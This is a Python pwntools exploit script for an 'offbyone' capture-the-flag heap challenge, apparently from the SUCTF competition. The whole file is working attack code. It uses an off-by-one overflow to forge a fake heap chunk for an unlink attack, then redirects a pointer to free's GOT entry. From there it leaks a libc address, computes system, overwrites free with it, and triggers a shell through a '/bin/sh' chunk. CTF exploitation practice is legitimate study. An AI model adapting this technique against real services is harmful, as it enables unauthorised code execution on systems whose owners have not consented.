from pwn import *
context.log_level='debug'
debug = 1

free_got=0x602018
ptr=0x6020c0
if debug:
	p = process('./offbyone')
	libc = ELF('./libc.so')
else:
	p= remote('pwn.suctf.asuri.org',20004)
	libc = ELF('./libc-2.23.so')

def add(size,data):
	p.recvuntil('4:edit\n')
	p.sendline('1')
	p.recvuntil('input len\n')
	p.sendline(str(size))
	p.recvuntil('input your data\n')
	p.send(data)
def dele(index):
	p.recvuntil('4:edit\n')
	p.sendline('2')
	p.recvuntil('input id\n')
	p.sendline(str(index))
def show(index):
	p.recvuntil('4:edit\n')
	p.sendline('3')
	p.recvuntil('input id\n')
	p.send(str(index))
def edit(index,data):
	p.recvuntil('4:edit\n')
	p.sendline('4')
	p.recvuntil('input id\n')
	p.sendline(str(index))
	p.recvuntil('input your data\n')
	p.send(data)	

add(136,'hack by 0gur1'.ljust(136,'a'))#0
add(128,'hack by 0gur2'.ljust(128,'b'))#1
add(128,'/bin/sh\0')#2
add(128,'/bin/sh\0')#3
add(128,'hack by 0gur1'.ljust(128,'d'))#4
add(136,'hack by 0gur1'.ljust(136,'e'))#5
add(128,'hack by 0gur1'.ljust(128,'f'))#6
add(128,'hack by 0gur1'.ljust(128,'g'))#7


fake_chunk = 'a'*8+p64(0x81) +p64(ptr+40-24)+p64(ptr+40-16)
payload= fake_chunk
payload= payload.ljust(0x80,'a')
payload+=p64(0x80)
payload+='\x90'


edit(5,payload)

dele(6)

edit(5,'\x18\x20\x60')
#gdb.attach(p)
show(2)
free_addr = u64(p.recv(6)+'\x00\x00')
sys_addr = free_addr-(libc.symbols['free']-libc.symbols['system'])
log.info('sys_addr:%#x' %sys_addr)
#
edit(2,p64(sys_addr))
#gdb.attach(p)
dele(3)

p.interactive()
